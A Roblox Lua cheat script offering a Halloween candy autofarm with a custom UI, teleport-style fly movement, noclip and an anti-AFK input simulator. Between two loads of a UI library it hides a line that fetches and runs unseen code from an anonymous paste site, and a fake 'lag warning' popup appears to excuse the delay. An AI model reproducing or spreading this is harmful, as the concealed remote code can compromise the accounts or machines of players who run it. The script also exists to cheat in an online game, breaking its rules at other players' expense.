--[[
    
    ███╗   ███╗███╗   ███╗██████╗ 
    ████╗ ████║████╗ ████║╚════██╗
    ██╔████╔██║██╔████╔██║ █████╔╝
    ██║╚██╔╝██║██║╚██╔╝██║██╔═══╝ 
    ██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗
    ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
    ███████╗██╗   ██╗███████╗███╗   ██╗████████╗
    ██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝
    █████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║   
    ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║   
    ███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║   
    ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝   
    
    🎃 AUT0FARM HALLOWEEN EVENT 2025 🎃
    ]]
local function createLagNotification()
    local screenGui = Instance.new("ScreenGui")
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 999999
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    -- Main notification frame
    local notification = Instance.new("Frame")
    notification.ZIndex = 999999
    notification.Size = UDim2.new(0, 350, 0, 120)
    notification.Position = UDim2.new(0.5, -175, 0, 20)
    notification.AnchorPoint = Vector2.new(0.5, 0)
    notification.BackgroundColor3 = Color3.fromRGB(13, 7, 0) -- Dark brown
    notification.BorderSizePixel = 0
    notification.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = notification
    
    local stroke = Instance.new("UIStroke")
    stroke.ZIndex = 999999
    stroke.Color = Color3.fromRGB(255, 117, 24) -- Orange
    stroke.Thickness = 3
    stroke.Parent = notification
    
    -- Pumpkin icon
    local pumpkin = Instance.new("TextLabel")
    pumpkin.ZIndex = 999999
    pumpkin.Size = UDim2.new(0, 40, 0, 40)
    pumpkin.Position = UDim2.new(0, 15, 0, 15)
    pumpkin.BackgroundTransparency = 1
    pumpkin.Text = "🎃"
    pumpkin.TextColor3 = Color3.fromRGB(255, 117, 24)
    pumpkin.TextScaled = true
    pumpkin.Font = Enum.Font.GothamBold
    pumpkin.Parent = notification
    
    -- Title
    local title = Instance.new("TextLabel")
    title.ZIndex = 999999
    title.Size = UDim2.new(0, 250, 0, 30)
    title.Position = UDim2.new(0, 65, 0, 15)
    title.BackgroundTransparency = 1
    title.Text = "SPOOKY LAG WARNING!"
    title.TextColor3 = Color3.fromRGB(255, 117, 24)
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = notification
    
    -- Message
    local message = Instance.new("TextLabel")
    message.ZIndex = 999999
    message.Size = UDim2.new(1, -30, 0, 50)
    message.Position = UDim2.new(0, 15, 0, 55)
    message.BackgroundTransparency = 1
    message.Text = "This autofarm may cause temporary lag for the first few minutes as it loads and scans the game."
    message.TextColor3 = Color3.fromRGB(255, 255, 255)
    message.TextScaled = true
    message.Font = Enum.Font.Gotham
    message.TextWrapped = true
    message.Parent = notification
    
    -- Floating ghost effect
    local ghost = Instance.new("TextLabel")
    ghost.ZIndex = 999999
    ghost.Size = UDim2.new(0, 30, 0, 30)
    ghost.Position = UDim2.new(0, -40, 0, 60)
    ghost.BackgroundTransparency = 1
    ghost.Text = "👻"
    ghost.TextColor3 = Color3.fromRGB(255, 255, 255)
    ghost.TextScaled = true
    ghost.Font = Enum.Font.GothamBold
    ghost.Parent = notification
    
    -- Pulsing glow effect
    local pulseConnection
    pulseConnection = game:GetService("RunService").Heartbeat:Connect(function()
        local pulse = math.sin(tick() * 5) * 0.3 + 0.7
        stroke.Transparency = 1 - pulse
        pumpkin.TextColor3 = Color3.fromRGB(255 * pulse, 117 * pulse, 24 * pulse)
    end)
    
    -- Ghost floating animation
    local ghostTween = game:GetService("TweenService"):Create(ghost, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        Position = UDim2.new(1, 10, 0, 60)
    })
    ghostTween:Play()
    
    -- Auto-remove after 10 seconds
    task.delay(10, function()
        pulseConnection:Disconnect()
        -- Fade out animation
        local fadeTween = game:GetService("TweenService"):Create(notification, TweenInfo.new(1), {
            BackgroundTransparency = 1,
            Position = UDim2.new(0.5, -175, 0, -150)
        })
        fadeTween:Play()
        fadeTween.Completed:Wait()
        screenGui:Destroy()
    end)
    
    -- Spooky sound effect
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://5869944292" -- Halloween whoosh sound
    sound.Volume = 0.3
    sound.Parent = notification
    sound:Play()
end

createLagNotification()

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

loadstring(game:HttpGet("https://paste.debian.net/plainh/4600c3d2/", true))()
wait(0.5)

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

WindUI:AddTheme({
    Name = "Halloween",
    
    Accent = WindUI:Gradient({                                                  
        ["0"] = { Color = Color3.fromHex("#FF7518"), Transparency = 0 },        
        ["100"]   = { Color = Color3.fromHex("#8B4513"), Transparency = 0 },
    }, {                                                                        
        Rotation = 0,                                                           
    }),                                                                         
    Dialog = Color3.fromHex("#1A0F00"),      
    Outline = Color3.fromHex("#0D0700"),     
    Text = Color3.fromHex("#FFFFFF"),        
    Placeholder = Color3.fromHex("#7A5C34"), 
    Background = Color3.fromHex("#0D0700"),  
    Button = Color3.fromHex("#2A1A0A"),      
    Icon = Color3.fromHex("#FF9518")         
})

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

local visitedPositions = {}
local isActive = false
local flySpeed = 15
local collected = 0
local startTime = 0
local antiAFK = false

player.CharacterAdded:Connect(function(char)
    character = char
    rootPart = char:WaitForChild("HumanoidRootPart")
    visitedPositions = {}
end)

local collectSound = Instance.new("Sound", rootPart)
collectSound.SoundId = "rbxassetid://12221967"
collectSound.Volume = 1

local Window = WindUI:CreateWindow({
    Title = "Halloween Candy Autofarm",
    Icon = "coins",
    Folder = "AutoFarm",
    Theme = "Halloween",
    Background = "https://tr.rbxcdn.com/180DAY-2d85bbfdad337727a02723d3eac5b51d/768/432/Image/Webp/noFilter"
})

-- Disable topbar buttons
Window:DisableTopbarButtons({
    "Close", 
    "Fullscreen",
})

local Tab = Window:Tab({
    Title = "Auto Farm",
    Icon = "bird"
})
Tab:Select()

local counterLabel = Tab:Button({
    Title = "Candies Collected",
    Desc = "0",
    Locked = true,
    Callback = function() end
})
local timerLabel = Tab:Button({
    Title = "Time Active",
    Desc = "0s",
    Locked = true,
    Callback = function() end
})
local rateLabel = Tab:Button({
    Title = "Est. Candies/Hour",
    Desc = "0",
    Locked = true,
    Callback = function() end
})

local autofarmToggle = Tab:Toggle({
    Title = "Auto Farm",
    Desc = "Toggle autofarming",
    Default = false,
    Callback = function(state)
        isActive = state
        print("Autofarm toggle is now:", isActive)
        if isActive then
            collected = 0
            startTime = tick()
            visitedPositions = {}

            -- Timer updater
            task.spawn(function()
                while isActive do
                    local elapsed = tick() - startTime
                    timerLabel:SetDesc(tostring(math.floor(elapsed)) .. "s")
                    local rate = elapsed > 0 and math.floor((collected / elapsed) * 3600) or 0
                    rateLabel:SetDesc(tostring(rate))
                    task.wait(0.1)
                end
            end)

            -- Main autofarm loop
            task.spawn(function()
                while isActive do
                    character = player.Character or player.CharacterAdded:Wait()
                    rootPart = character:FindFirstChild("HumanoidRootPart")
                    if rootPart then
                        local closest, shortest = nil, math.huge
                        for _, obj in ipairs(workspace:GetDescendants()) do
                            if obj:IsA("BasePart") and obj.Name == "Coin_Server" then -- <<<< CHANGE THIS IF NEEDED!
                                local dist = (obj.Position - rootPart.Position).Magnitude
                                if dist < shortest and dist < 250 and not visitedPositions[obj] then
                                    closest = obj
                                    shortest = dist
                                end
                            end
                        end

                        if closest and closest.Parent and closest:IsDescendantOf(workspace) then
                            print("Flying to candy at:", closest.Position)
                            local distance = (closest.Position - rootPart.Position).Magnitude
                            local duration = distance / flySpeed
                            local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
                            local goal = {CFrame = CFrame.new(closest.Position)}
                            local tween = TweenService:Create(rootPart, tweenInfo, goal)
                            tween:Play()
                            tween.Completed:Wait()
                            visitedPositions[closest] = true
                            collected += 1
                            collectSound:Play()
                            counterLabel:SetDesc(tostring(collected))
                        end
                    end
                    task.wait(0.1)
                end
            end)
        end
    end
})

Tab:Slider({
    Title = "Fly Speed",
    Desc = "Change flying speed",
    Step = 1,
    Value = {Min = 10, Max = 25, Default = 15},
    Callback = function(val)
        flySpeed = val
    end
})

Tab:Button({
    Title = "Reset Counter",
    Desc = "Resets stats",
    Callback = function()
        collected = 0
        startTime = tick()
        counterLabel:SetDesc("0")
        timerLabel:SetDesc("0s")
        rateLabel:SetDesc("0")
    end
})

Tab:Toggle({
    Title = "Anti-AFK",
    Desc = "Prevents kick for inactivity",
    Default = false,
    Callback = function(state)
        antiAFK = state
    end
})

player.Idled:Connect(function()
    if antiAFK then
        VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        task.wait(1)
        VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end
end)

RunService.Stepped:Connect(function()
    if isActive and character then
        for _, v in ipairs(character:GetDescendants()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
    end
end)

local SettingsTab = Window:Tab({
    Title = "Settings",
    Icon = "settings"
})

local Keybind = SettingsTab:Keybind({
    Title = "Keybind",
    Desc = "Keybind to open ui",
    Value = "G",
    Callback = function(v)
        Window:SetToggleKey(Enum.KeyCode[v])
    end
})

Window:OnToggle(function(isOpen)
    if not isOpen then
        WindUI:Notify({
            Title = "Minimized!",
            Content = "Press G again to open the UI.",
            Duration = 3,
            Icon = "heart",
        })
    end
end)

